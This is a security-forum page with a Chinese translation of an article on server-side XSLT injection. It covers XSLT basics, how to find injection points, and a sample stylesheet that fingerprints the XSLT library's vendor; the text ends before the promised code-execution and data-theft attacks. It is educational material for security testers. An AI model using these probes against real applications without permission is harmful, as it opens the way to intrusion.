

<!DOCTYPE html>
<html lang="zh-cn">
<head>
		
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="author" content="XiunoBBS 4.0" />
	<meta name="keywords" content="[翻译]XSLT 服务端注入攻击" />
	<meta name="description" content="[翻译]XSLT 服务端注入攻击" />
	<meta name="application-name" content="[翻译]XSLT 服务端注入攻击-外文翻译-看雪-安全社区|安全招聘|kanxue.com" />
	<meta name="csrf-token" content="f78149aa92559c831a2d388edf0a81ff">
	<meta name="renderer" content="webkit">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
		<title>
		[翻译]XSLT 服务端注入攻击-外文翻译-看雪-安全社区|安全招聘|kanxue.com	</title>

	<link rel="shortcut icon" href="https://bbs.kanxue.com/view/img/favicon.ico" />
	<link rel="icon" sizes="32x32" href="https://bbs.kanxue.com/view/img/favicon.ico">
	<link rel="Bookmark" href="https://bbs.kanxue.com/view/img/favicon.ico" />
	<link rel="stylesheet" href="https://bbs.kanxue.com/view/css/bootstrap.css?1.5">
	<link rel="stylesheet" href="https://bbs.kanxue.com/view/css/bootstrap-bbs.css?1.5">
	<!-- <link rel="stylesheet" href="view/css/bootstrap-icon.css"> -->

	<link rel="stylesheet" href="https://bbs.kanxue.com/plugin/kanxue/css/kanxue.css?1.5">
	<link rel="stylesheet" href="https://bbs.kanxue.com/view/css/icon/iconfont.css">
	<style>@media only screen and (max-width: 780px) {

			.card>.card-body {
				padding: 0.3rem 0.5rem;
			}

			#body {
				padding: 0.5rem 0.5rem;
			}

			.container {
				padding-left: 0;
				padding-right: 0;
			}

		}

		.content_box ul.nav .nav-link.active {
			border-bottom: 3px solid #0099ee;
		}

		.avatar-3 {
			width: 3.5rem;
			height: 3.5rem;
			border-radius: 3.5rem;
		}
		.avatar-2_4 {
			width: 2.4rem;
			height: 2.4rem;
			border-radius: 2.4rem;
		}
		main#body {
			background: #e9ecef;
		}
	</style>

	<style>/* .photo_frame {
			padding: 0.36rem;
		}
		.photo_frame::after {
			content: '';
			background-size: 102%;
			background-position: right top;
			background-repeat: no-repeat;
			width: 100%;
			height: 100%;

			display: inline-block;
			vertical-align: middle;
			position: absolute;
			top: 0;
			left: 0;
			right: 0;
			bottom: 0;
			z-index: 1;
		}

		.photo_frame_image1::after {
			background-image: url(https://bbs.kanxue.com/view/img/20photo_frame1.png);
		}

		.photo_frame_image2::after {
			background-image: url(https://bbs.kanxue.com/view/img/20photo_frame2.png);
		}

		.photo_frame_image3::after {
			background-image: url(https://bbs.kanxue.com/view/img/20photo_frame3.png);
		} */

	</style>
	<link rel="stylesheet" href="https://www.kanxue.com/view/css/vip.css">
	    <link rel="stylesheet" href="https://bbs.kanxue.com/plugin/xn_chm/css/user_tree.css" type="text/css">
    <link rel="stylesheet" href="https://bbs.kanxue.com/plugin/xn_chm/css/folder-tree.css" type="text/css">
<style>/*
box-shadow: 0 0 5px red;
*/
@keyframes xndigest {
	0% { color: red; text-shadow: 0 0 3px #FF8D8D;} 
	20% { color: orange; text-shadow: 0 0 3px #FFE1AD;} 
	40% { color: green; text-shadow: 0 0 3px #B3FFAF;} 
	65% { color: blue; text-shadow: 0 0 3px #AFE4FF;} 
	80% { color: purple; text-shadow: 0 0 3px #FFC9F3;} 
	100% { color: red; text-shadow: 0 0 3px #FF8D8D;} 
}

/*水晶闪烁效果 占内存*/
i.icon-diamond.flash{color: #D53D38;  /*animation: xndigest 5s linear infinite;*/ }

i.icon-digest-1 {  text-shadow: 0 0 3px #AFE4FF; }
i.icon-digest-2 {  text-shadow: 0 0 3px #FFF177; }
i.icon-digest-3 {  text-shadow: 0 0 3px #FF8D8D; }
.icon-digest-1:before { content: "\f219";  color: #5BC0DE;} /* "\f0a5" */
.icon-digest-2:before { content: "\f219";  color: #ECA541;}
.icon-digest-3:before { content: "\f219"; color: #D53D38;}
.icon-digest-3:afteer { content: "精"; color: #D53D38;}
</style><style>.deleted div.subject > a { text-decoration: line-through; color: grey !important; }
.deleted div.message { text-decoration: line-through; color: grey !important; }
</style><style>/*
.toggle_more {
	max-height: 100px;
}
*/
.update_log_list a.update_log_history, 
.update_log_list a.update_log_delete {
	display: none;
}

.update_log_list > li:hover {
	background: var(--gray-300);
}
.update_log_list > li:hover > a.update_log_history, 
.update_log_list > li:hover > a.update_log_delete {
	display: inline-block;
}

</style><style>.icon-new { width: 26px; height: 12px; display: inline-block; background: url(https://bbs.kanxue.com/view/img/new.gif)}
</style>

</head>

<body>
	
<style>.top-banner {
		height: 100px;
		overflow: hidden;
		display: none;
		background:#0d1e28 url('');
		background-repeat: no-repeat;
		background-position: center center;
		background-size: cover;
	}
	@media only screen and (max-width: 780px) {
		.top-banner-section {
			display: none;
		}
	}
</style>
<!-- 顶部广告条 -->
<!-- 顶部广告条结束 -->	
	<style>.btn-default {
    color: #333;
    background-color: #fff;
    border-color: #ccc;
}
#header {
    /* border-top: 3px solid #0099ee; */
    box-shadow: 0px 2px 10px 0px rgba(0, 0, 0, 0.1), 0 1px rgba(0, 0, 0, 0.1);
    background: #fafafa;
}

#header .container {
    height: 64px;
    line-height: 64px;
}

#header .navbar {
    padding: 0;
}

#header nav li.nav-item {
    line-height: 34px;
}

#header nav a.nav-link {
    font-size: 16px;
    color: #757575;
    font-weight: 500;
    text-decoration: none;
}
#header .login_btn,  #header .reg_btn{
	font-size: 13px;
	padding: 4px 16px;
	
	font-weight: 500;
	color: #0099ee;
	text-decoration: none;
	border: 1px solid #0099ee;
}
#header .reg_btn {
	color: #fff;
	background: #0099ee;
}
#header nav a.nav-link,
#header nav .dropdown {
    padding: 0 1rem;
}

#header nav a.nav-link:hover {
    background-color: #F3F3F3;
}

#header nav li.nav-item.active a {
    color: #0099ee;
    font-weight: 600;
}

#header nav .home_seach_form {
    border: 1px solid #ccc;
    border-radius: 4px;
}

#header nav .dropdown a.dropdown-item:hover {
    color: #0099ee;
    text-decoration: none;
    background-color: #f3f3f3;
}

.dropup .dropdown-toggle::after {
    display: none !important;
}

.bottom-nav {
    /* display: none; */
    background-color: #fafafa;
    box-shadow: 0 -1px rgba(0,0,0,0.1), 0 -2px 10px rgba(0,0,0,0.1);
}
.bottom-nav .opts-group {
    position: relative;
    display: inline-block;
    /* padding-top: 6px; */
    line-height: 20px;
    color: #9e9e9e;
    cursor: pointer;
}
.bottom-nav .opts-group.active {
    color: #0099ee;
}

@media only screen and (min-width: 992px) {
    .bottom-nav, .header_seach_but {
        display: none !important;
    }
    
}
@media only screen and (max-width: 992px) {
    .nav-logo {
        margin-right: 0 !important;
    }

	.nav_user_item {
		width: 96px;
	}
	.nav_user_item .login_btn,  .nav_user_item .reg_btn {
		padding: 3px 6px !important;
	}
}

.seach_li {
    margin-left: 40px;
}

@media only screen and (max-width: 1200px) {
    .seach_li {
        margin-left: 0px !important;
        width: 100%;
        max-width: 120px !important;
    }
}
.dropdown i.angle-down {
    display: inline-block;
    transition: transform linear .2s, -webkit-transform linear .2s, -o-transform linear .2s;
    
}
.dropdown.active i.angle-down {
    transform: rotate(180deg);
}

</style>

<header id="header">
    <div class="container" style="padding-right: 15px;padding-left: 15px;">
        <nav class="navbar navbar-expand-lg navbar-light">
            <a href="https://bbs.kanxue.com/search.htm" class="header_seach_but" style="display:block; width: 96px;"><i class="icon-search" aria-hidden="true"></i></a>
            <a class="navbar-brand nav-logo" href="https://bbs.kanxue.com/" style="line-height: 0px;" title="看雪-安全社区|安全招聘|kanxue.com">
                <img src="https://bbs.kanxue.com/plugin/kanxue/img/kanxuelogo.png" height="25" alt="看雪-安全社区|安全招聘|kanxue.com"/>
            </a>
            <div class="collapse navbar-collapse" id="navbarTogglerDemo03">
                <ul class="navbar-nav mr-auto mt-2 mt-lg-0">
                    <li class="nav-item">
                        <a class="nav-link" href="https://www.kanxue.com">首页</a>
                    </li>
                    
                    <li class="nav-item">
                        <a class="nav-link" href="https://www.kanxue.com/course.htm">课程</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="https://www.kanxue.com/question-list.htm">问答</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="https://ctf.kanxue.com">CTF</a>
                    </li>
                    <!-- <li class="nav-item  position-relative">
                        <div class="dropdown">
                            <a class="dropdown-toggle nav-link px-0" href="#" role="button" id="ctfdropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                CTF
                            </a>
                            <img class="position-absolute" style="width: 27px; top: -5px; right: -7px; z-index: 3;" src="//passport.kanxue.com/pc/view/img/hot.png" alt="">
                            <div class="dropdown-menu " aria-labelledby="ctfdropdownMenuLink">
                                <a class="dropdown-item" style="color: #212529; font-weight: 400;" href="//ctf.kanxue.com">CTF竞赛</a>
                                <a class="dropdown-item" style="color: #212529; font-weight: 400;" href="//ctf.kanxue.com/itembank.htm">题库</a>
                                
                            </div>
                        </div>
                    </li> -->
                    <li class="nav-item active">
                        <a class="nav-link" href="https://bbs.kanxue.com">社区</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="https://job.kanxue.com">招聘</a>
                    </li>
                    <li class="nav-item position-relative">
                            <a class="nav-link" href="https://www.kanxue.com/conference.htm">看雪峰会</a>
                            <!-- <img class="position-absolute" style="width: 27px; top: -5px; right: -7px; z-index: 3;" src="//passport.kanxue.com/pc/view/img/hot.png" alt=""> -->
                    </li>
                    <li class="nav-item">
                        <div class="dropdown">
                            <a class="dropdown-toggle nav-link px-0" href="#" role="button" id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                发现
                            </a>
                            <div class="dropdown-menu " aria-labelledby="dropdownMenuLink">
                                <!-- <a class="dropdown-item" href="//ctf.kanxue.com">CTF</a> -->
                                <a class="dropdown-item" href="https://qifu.kanxue.com">企服</a>
                                <!-- <a class="dropdown-item" href="//ce.kanxue.com">众测</a> -->
                                <a class="dropdown-item" href="https://www.kanxue.com/rank.htm">排行榜</a>
                                <a class="dropdown-item" href="https://www.kanxue.com/chm.htm">知识库</a>
                                <a class="dropdown-item" href="https://www.kanxue.com/tool.htm">工具下载</a>
                                <!-- <a class="dropdown-item" href="//www.kanxue.com/conference.htm">看雪峰会</a> -->
                                <a class="dropdown-item" href="https://www.kanxue.com/mrt.htm">看雪20年</a>
                                <a class="dropdown-item" href="https://www.kanxue.com/shop.htm">看雪商城</a>
                                <a class="dropdown-item " href="https://www.kanxue.com/certificate.htm">证书查询</a>
                            </div>
                        </div>
                    </li>
                    <li class="seach_li">
                        <form class="form-inline my-2 my-lg-0 mr-auto" action="https://bbs.kanxue.com/search.htm"  id="search_form" style="margin-right: 20px; max-width: 150px;">
                            <div class="input-group home_seach_form">
                                <input type="text" class="form-control border-0"  name="keyword" placeholder="社区关键词 回车搜索">
                                <div class="input-group-append">
                                    <button class="btn px-2" type="submit" id="button-addon2">
                                        <i class="icon-search"></i>
                                    </button>
                                </div>
                            </div>
                        </form>
                    </li>
                </ul>
                
            </div>
            <div class="text-right nav_user_item" style="white-space: nowrap;">
                                <a class="login_btn" href="javascript:;">登录</a>
                
                <!-- <a class="login_btn" href="//passport.kanxue.com/user-login.htm">登录</a> -->
                <a class="reg_btn ml-2" href="https://passport.kanxue.com/user-mobile-1.htm">注册</a>
                            </div>
            
        </nav>
    </div>
</header>
<div class="position-fixed w-100 header_fiexd bottom-nav" style="width: 100%; height: 50px; bottom: 0; z-index: 2; background: #fafafa;">
    <div class="row mx-0 text-center align-items-center" style="height: 50px;">
        <a href="https://www.kanxue.com" class="d-inline-blok col px-0 header_nav_a opts-group " style="max-width: 20%;">
            <div>
                <i class="icon-home"></i>
            </div>
            <div>
                首页
            </div>
        </a>
        <a href="https://bbs.kanxue.com" class="d-inline-blok col px-0 header_nav_a opts-group active" style="max-width: 20%;">
            <div>
                <i class="icon-comments"></i>
            </div>
            <div>
                社区
            </div>
        </a>
        
        <a href="https://www.kanxue.com/course.htm" class="d-inline-blok col px-0 header_nav_a opts-group" style="max-width: 20%;">
            <div>
                <i class="icon-book"></i>
            </div>
            <div>
                课程
            </div>
        </a>
        <a href="https://job.kanxue.com" class="d-inline-blok col px-0 header_nav_a opts-group" style="max-width: 20%;">
            <div>
                <i class="icon-clipboard"></i>
            </div>
            <div>
                招聘
            </div>
        </a>
        
        <div class=" dropup d-inline-blok col px-0"  style="max-width: 20%;">
            <a class="dropdown-toggle d-inline-block header_nav_a opts-group" href="#" role="button" id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <div>

                    <i class="icon-list"></i>
                </div>
                <div>
                    发现
                </div>
            </a>
            <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
                <a class="dropdown-item" href="https://www.kanxue.com/question-list.htm">问答</a>
                <a class="dropdown-item" href="https://qifu.kanxue.com">企服</a>
                <a class="dropdown-item" href="https://zhuanlan.kanxue.com">专栏</a>
                <a class="dropdown-item" href="https://ctf.kanxue.com">CTF</a>
                <!-- <a class="dropdown-item" href="//ctf.kanxue.com/itembank.htm">题库</a> -->
                <!-- <a class="dropdown-item" href="//ce.kanxue.com">众测</a> -->
                <a class="dropdown-item" href="https://www.kanxue.com/rank.htm">排行榜</a>
                <a class="dropdown-item" href="https://www.kanxue.com/chm.htm">知识库</a>
                <a class="dropdown-item" href="https://www.kanxue.com/tool.htm">工具下载</a>
                <a class="dropdown-item" href="https://www.kanxue.com/conference.htm">看雪峰会</a>
                <a class="dropdown-item" href="https://www.kanxue.com/mrt.htm">看雪20年</a>
                <a class="dropdown-item" href="https://www.kanxue.com/shop.htm">看雪商城</a>
                <a class="dropdown-item" href="https://www.kanxue.com/certificate.htm">证书查询</a>
            </div>
        </div>
       
    </div>
</div>


		<main id="body">
	<div class="container">
		


<link rel="stylesheet" type="text/css" href="https://bbs.kanxue.com/plugin/xn_syntax_hightlighter/syntax_hightlighter/syntax.css">
<link type="text/css" rel="stylesheet" href="https://bbs.kanxue.com/plugin/chao_editor/css/katex.min.css" />
<style>.table thead th {
		vertical-align: bottom;
		border-bottom: unset !important;
	}

	.postlist tr.post:first-child td {
		border-top: unset !important;
	}

	.postlist tr.post,
	.postlist tr.post:last-child td {
		border-bottom: unset !important;
	}

	.qqFace img:hover {
		border-color: #0066cc !important;
	}

	.btn-0099ee {
		background-color: #0099ee;
		color: #fff !important;
	}

	.btn-followed {
		background-color: #c0c5cc;
		color: #fff !important;
	}

	.thread-poptip-box {
		display: none;
		top: 0%;
		left: 100%;
		z-index: 5;
		width: 380px;
		border-radius: 5px;
		box-shadow: 0 4px 12px 0 rgba(37, 77, 157, .1) !important;
		color: #494b4d !important;
		transition: all 500ms;
	}

	.thread-poptip-box1 {
		display: none;
		top: 100%;
		right: 0;
		z-index: 1;
		width: 380px;
		border-radius: 5px;
		box-shadow: 0 4px 12px 0 rgba(37, 77, 157, .1) !important;
		color: #494b4d !important;
		transition: all 500ms;
	}

	@media screen and (min-width: 992px) {
		.post_online_time {
			cursor: pointer;
		}

		img.huoyue_num {
			transition: all 200ms ease;
		}

		img.huoyue_num:hover {
			transform: scale(1.5);
		}
	}

	svg.icon {
		width: 3rem;
		height: 1.3rem;
		vertical-align: middle;
		fill: currentColor;
		overflow: hidden;
	}

	.breadcrumb {
		background-color: unset !important;
		border: unset !important;
		box-shadow: unset !important;
	}

	.breadcrumb:hover {
		background-color: unset !important;
	}

	.nav .active {
		font-weight: 800;
		color: #0099ee !important;
	}

	.card>.card-header {
		color: #161616;
		text-shadow: unset !important;
		padding: 0.6rem 1rem;
		border-bottom: 1px solid #eeeeee;
		background: #fff !important;
	}

	div.btn-group.mod-button {
		flex-wrap: wrap;
	}

	div.btn-group.mod-button button {
		margin-top: 0.5rem;
	}

	.collection_thumb_left i {
		font-size: 18px;
	}
</style>
<style>/* 收藏点赞区样式 */
	.card_collection {
		border-radius: 5px;
		width: 70px;
		vertical-align: middle;
		display: inline-block;
	}

	.card_collection div {
		margin-bottom: 0px;
		font-size: 14px;
	}

	.card_collection div>a>i {
		font-size: 22px;
	}

	.card_collection div a {
		text-decoration: none;
	}

	.alipay-bg {
		width: 60px;
		height: 20px;
		display: inline-block;
		vertical-align: middle;
		background: url(https://bbs.kanxue.com/view/img/reward_alipay.png) 0 0 no-repeat;
	}

	.color4A4A4A {
		color: #C4C4C4;
	}

	.bbsshare_modal {
		position: absolute;
		z-index: 2;
		top: 0;
		right: -155px;
	}

	.likes_box_hide {
		display: none;
	}

	.likes_box_show {
		display: inline;
	}

	.position-sticky {
		position: -webkit-sticky;
		position: sticky;
	}

	/* 右侧目录样式 */


	.is-collapsible {
		max-height: 1000px;
		overflow: hidden;
		transition: all 300ms ease-in-out
	}

	.is-collapsed {
		max-height: 0
	}

	.is-position-fixed {
		position: fixed !important;
		top: 0
	}

	.is-active-link {
		font-weight: 700
	}

	.js-toc {
		max-height: 21rem;
		overflow: auto;
	}

	.js-toc ol {
		margin: 0;
		padding-left: 1rem;
		list-style-type: none;
	}

	.js-toc a {
		width: 100%;
		margin: 0.2rem 0 0;
		white-space: nowrap;
		overflow: hidden;
		text-overflow: ellipsis;
		display: inline-block;

	}

	.js-toc li.is-active-li a.is-active-link {
		color: #0099ee;
		font-weight: bolder;
	}

	.show_tocbot {
		display: none;
	}
</style>

<ol class="breadcrumb mb-3">
	<li class="breadcrumb-item"><a href="https://bbs.kanxue.com/" aria-label="首页"><i class="icon-home"></i>
			看雪社区</a></li>
	<li class="breadcrumb-item"><a href="https://bbs.kanxue.com/forum-32.htm">外文翻译</a></li>

	<div class="media-body text-right">
				<a href="https://bbs.kanxue.com/thread-create-32.htm" role="button" class="btn btn-sm btn-primary"
			style="float: right; border: 1px solid #0099ee;">发新帖</a>
			</div>
</ol>


<div class="row mx-0">
	<div class="col-12 col-md-9 px-0">
		<div class="left_content">
			<div class="position-fixed text-center collection_thumb_left"
				style="z-index: 2; width: 70px; margin-left: -70px;display: none;">
				<div>
										<a href="javascript:void(0)" class="favorite d-inline-block bg-white" title="收藏"
						style="text-decoration: none; border: 1px solid #DDDDDD; border-radius: 100%; width: 40px; height: 40px; line-height: 40px;">
						<i class="icon-star-o color4A4A4A"></i>
												</a>
						<div>
							<span class="likes_box likes_box_hide" style="font-size: 13px;color: #0099ee;"><span
									class="likes">2</span></span>
						</div>
				</div>
				<div class="mt-3">
										<a href="javascript:void(0)" class="d-inline-block bg-white thumb"
						style="text-decoration: none; border: 1px solid #DDDDDD; border-radius: 100%; width: 40px; height: 40px; line-height: 40px;">
						<i class="icon-thumbs-o-up color4A4A4A"></i>
												</a>
						<div>
							<span class="thumbs_num_box" style="font-size: 13px;color: #0099ee;"><span
									class="thumbs_num">1</span></span>
						</div>
				</div>
				<div class="mt-3">
					<a href="javascript:void(0)" id="exampleModalLabel" class="d-inline-block bg-white"
						style="text-decoration: none; border: 1px solid #DDDDDD; border-radius: 100%; width: 40px; height: 40px; line-height: 40px;"
						data-toggle="modal" data-target=".reward">
						<i class="icon-rmb color4A4A4A"></i>
					</a>
				</div>
			</div>

			<div class="card message_card">
				<div class="mb-0">
					<div class="card-body">
						<div class="d-none d-lg-block">
							<dl class="row">
								<dd class="vtop">
									<dl class="row small" style="height: 34px; line-height: 34px;">
										<dt style="padding: 0px;">
											
											<div class="break-all m-0">
																		
												<span style="font-size: 1.4rem;">[翻译]XSLT 服务端注入攻击</span>
												
												
																		
									<i class="icon-digest-2" aria-hidden="true" title="优秀"></i>
												</div>
											
										</dt>

									</dl>
									<dl class="row small mt-1">
										<dt style="padding: 0px;">
											
											<div>
												<span class="date text-grey ml-1"><i class="icon-clock-o"
														aria-hidden="true"></i>
													2017-11-23 17:30</span>
												<span class="text-grey ml-3 hidden-md-down"><i class="icon-eye"
														aria-hidden="true"></i> 4468</span>
												
												<!-- <span class="post_online_time" style="vertical-align: text-bottom;" data-online_time="648300" data-desc="" onmouseenter="show_online_level(event)"> </span> -->
											</div>
											
										</dt>
										<dd class="text-right">
										
																						
											
																						
																					</dd>
									</dl>

																	</dd>
							</dl>
						</div>
						<!-- choadi 手机端适配 开始-->
						<div class="px-3 pt-3 d-block d-lg-none">
							
							<h3 class="break-all subject m-0">
																						[翻译]XSLT 服务端注入攻击																
																		
									<i class="icon-digest-2" aria-hidden="true" title="优秀"></i>
								</h3>
							
							<div class="row mx-0 mt-2">
								<div class="col-8 px-0">
									<a href='https://bbs.kanxue.com/user-home-747240.htm' style="text-decoration: none;"
										aria-hidden="true" tabindex="-1">
										<img style="width: 2rem; height: 2rem; border-radius: 6rem;"
											src="https://passport.kanxue.com/upload/avatar/240/747240.png?1502630198">
									</a>

									<a class="small" href='https://bbs.kanxue.com/user-home-747240.htm'
										style="text-decoration: none;">hesir</a>
									<img class="huoyue_num" src="https://bbs.kanxue.com/view/img/rank/5.png" width="22"
										alt="活跃值">
																		<div class="d-inline-block" style="font-size: 12px;">
										<span class="icon-diamond text-danger" title="精华数"></span>
										<span class="font-weight-bold text-danger">
											1</span>
									</div>
																	</div>
								<div class="col px-0 text-right">
									
									
																		
																	</div>
								<!-- <img style="" src="//bbs.kanxue.com/view/img/stars03.gif" alt="">  -->


							</div>
							<div class="small row mx-0 mt-2">
								<div class="col px-0">
									<svg class="icon" aria-hidden="true">
										<use xlink:href="#icon-group_109"></use>
									</svg>
									<span class="post_online_time" style="vertical-align: text-bottom;"
										data-online_time="648300" data-desc=""
										onmouseenter="show_online_level(event)"> </span>
								</div>
								<div class="col px-0 text-right">
																		
									
																	</div>
							</div>
							<div class="small row mx-0 mt-2">
								<div class="col px-0"><span
										class="date text-grey">2017-11-23 17:30</span></div>
								<div class="col px-0 text-right"><span class="text-grey hidden-md-down"><i class="icon-eye"
											aria-hidden="true"></i> 4468</span></div>
							</div>

													</div>
						<!-- choadi 手机端适配 结束-->

						
						<hr aria-hidden="true" />

						<div class="message " isfirst="1">
							
							
							<h1><a name="前言" class="anchor" href="#%E5%89%8D%E8%A8%80"><span class="header-link"></span></a>前言</h1><hr />
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>XSLT<a href="https://baike.baidu.com/item/XSLT/1330564?fr=aladdin">(扩展样式表转换语言)</a>漏洞可能会给那些受到影响的应用带来严重的后果，经常会导致远程代码执行。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>举几个已被公开的 XSLT 远程代码执行漏洞的例子，<a href="https://technet.microsoft.com/library/security/msvr12-016">CVE-2012-5357</a> 影响了 .NET Ektron CMS；<a href="http://seclists.org/bugtraq/2012/Mar/110">CVE-2012-1592</a> 影响了Apache Struts 2.0；<a href="http://www.cvedetails.com/cve/cve-2005-3757">CVE-2005-3757</a> 影响了 Google 搜索应用。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>从上面的例子可以看出，XSLT 漏洞可谓是由来已久，但是它并不像一些类似的漏洞(例如 XML 漏洞)那样常见。尽管我们经常在我们的安全评估中看到它的身影，但是有关该漏洞及其相关利用技术的文章却并不多见。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>本文将通过展示一些经过精心挑选的 XSLT 攻击来说明这种技术以不安全的方式使用时所存在的风险。例如：远程执行任意代码、窃取远程系统数据、执行网络端口扫描以及获取受害者内部网络资源。本文还会提供一个简单的易受攻击的 .NET 应用，可用于练习本文中所展示攻击，最后提供几条规避 XSLT 漏洞的建议。<br /><br /></p>
<h1><a name="" class="anchor" href=""><span class="header-link"></span></a>什么是 XSLT ？</h1><hr />
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>XSLT（扩展样式表转换语言）是一种对 XML 文档进行转化的语言。XML 文档通过 XSLT 转化后可以变成为另一份不同的 XML 文档，或者其他类型的文档，例如 HTML 文档、 CSV 文件、纯文本文件等。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>XSLT 通常用于转换被不同应用加工过的文件格式，还有就是作为一个模板引擎。许多企业级应用广泛地使用了 XSLT ，例如一个多租户发票应用可能会允许客户使用 XSLT 来高度定制他们的发票，比如根据自己的特殊需要来改变发票内容和发票格式。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>其他一些常见的 XSLT 应用场景：</p>
<ul>
<li><p>报道</p>
</li>
<li><p>将数据以不同的格式导出</p>
</li>
<li><p>打印</p>
</li>
<li><p>发邮件</p>
</li>
</ul>
<p>在展示攻击之前，我们不妨先通过一个简单的例子看看这个转化到底是怎么回事。以下面这段包含了一些水果名及相关介绍的 XML 文档为例。</p>
<pre class="brush:python;toolbar:false">&lt;?xml version="1.0" ?&gt;
&lt;fruits&gt;
  &lt;fruit&gt;
    &lt;name&gt;Lemon&lt;/name&gt;
    &lt;description&gt;Yellow and sour&lt;/description&gt;
  &lt;/fruit&gt;
  &lt;fruit&gt;
    &lt;name&gt;Watermelon&lt;/name&gt;
    &lt;description&gt;Round, green outside, red inside&lt;/description&gt;
  &lt;/fruit&gt;
&lt;/fruits&gt;
</pre><p>为了将该 XML 文档转化为纯文本文档，可使用如下 XSL 文档：</p>
<pre class="brush:python;toolbar:false">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
  &lt;xsl:template match="/fruits"&gt;
    Fruits:
    &lt;!-- Loop for each fruit --&gt;
    &lt;xsl:for-each select="fruit"&gt;
      &lt;!-- Print name: description --&gt;
      - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;
    &lt;/xsl:for-each&gt;
  &lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</pre><p>转换结果如下：</p>
<pre class="brush:python;toolbar:false">Fruits:

      - Lemon: Yellow and sour
      - Watermelon: Round, green outside, red inside
</pre><p>（译注：可参考<a href="http://www.w3school.com.cn/xsl/xsl_transformation.asp">XSLT - 转换</a>）<br /><br /></p>
<h1><a name="" class="anchor" href=""><span class="header-link"></span></a>XSLT 服务端注入攻击</h1><hr />
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>本部分会展示一套测试应用是否存在 XSLT 漏洞的方法，覆盖了从发现到利用的全过程。例子是一个使用微软 System.Xml XSLT 实现的易受攻击的应用。类似的技术同样可应用于一些其他的常见的库，如 Libxslt 、 Saxon 、 Xalan 。</p>
<h2><a name="找到切入点" class="anchor" href="#%E6%89%BE%E5%88%B0%E5%88%87%E5%85%A5%E7%82%B9"><span class="header-link"></span></a>找到切入点</h2><p>第一步是定位应用可能存在漏洞的地方。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>最简单的情景就是应用允许用户上传任意 XSLT 文件。如果上述情景不存在，一个易受攻击的应用可能会使用不可信的用户输入动态地生成 XSLT 文档。例如，该应用可能会生成如下的 XSLT 文档，字符串"Your Company Name Here"这里对应的就是不可信的用户输入。</p>
<pre class="brush:python;toolbar:false">&lt;?xml version=”1.0” encoding=”utf-8”?&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
  &lt;xsl:template match="/fruits"&gt;
    Your Company Name Here
    Fruits:
    &lt;!-- Loop for each fruit --&gt;
    &lt;xsl:for-each select="fruit"&gt;
      &lt;!-- Print name: description --&gt;
      - &lt;xsl:value-of select="name"/&gt;: &lt;xsl:value-of select="description"/&gt;
    &lt;/xsl:for-each&gt;
  &lt;/xsl:template&gt;
  &lt;xsl:include href="external_transform.xslt"/&gt;
&lt;/xsl:stylesheet&gt;
</pre><p>为了验证该应用是否是易受攻击的，我们通常会插入一些会导致 XML 文件语法错误的字符，例如双引号、单引号和尖括号{", ', &lt;, &gt;}。如果服务器会返回错误，那么这个应用就有可能是易受攻击的。一般而言，这种定位技术与定位 XML 注入漏洞的技术类似。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>后面将要提到的攻击中有一些仅在文件的特定区域注入时才有效。不过别担心，本文也会展示一种利用 import 和 include 功能来绕开这种限制的技术。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>为了使文章简单易懂，除非另有说明，在接下来的例子中我们将假设我们可以向应用提交任意的 XSLT 文档。</p>
<h2><a name="" class="anchor" href=""><span class="header-link"></span></a>使用 system-property() 函数提取指纹</h2><p>一旦找到了攻击切入点，接下来提取系统指纹和明确应用正在使用的 XSLT 库是非常有必要的。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>在进行攻击之前，如果知晓了应用所使用的 XSLT 库是十分有用地。因为不同的库支持的 XSLT 功能不同，所以可能存在这样的情况，一个功能在这个库中是可以使用的，但是换成另一个库中却无法使用了。专有扩展通常都不支持库间兼容。此外，不同的库的默认设置可能存在较大差异，通常来说，旧的库会默认启用一些存在风险的功能，但是新的库则要求开发者在需要时手动开启这些功能。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>使用 system-property() 函数可以查出一个库的供应商名称，这是 XSLT v1.0 标准的一部分，所有的库都支持该功能。该函数有效的参数有：</p>
<ul>
<li><p>xsl:vendor</p>
</li>
<li><p>xsl:vendor-url</p>
</li>
<li><p>xsl:version</p>
</li>
</ul>
<p>下面的 XSL 文档可用于查出库的供应商：</p>
<pre class="brush:python;toolbar:false">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
  &lt;xsl:template match="/fruits"&gt;
    &lt;xsl:value-of select="system-property('xsl:vendor')"/&gt;
  &lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</pre><p>由于本文的被测试应用使用的是 .NET System.xml ，因此返回值是 Microsoft 。</p>
